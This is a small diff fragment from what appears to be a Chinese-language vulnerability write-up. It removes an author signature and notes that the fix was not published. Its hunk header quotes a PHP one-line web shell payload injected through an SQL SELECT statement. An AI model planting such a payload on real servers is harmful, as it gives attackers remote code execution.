@@ -94,6 +94,3 @@ select '<?phpeval($_REQUEST[yunsee])?>';
 
 fix的内容没发出来，就不写（抄）了
 
-<p style="text-align: right;">
-by. Huaji
-</p>
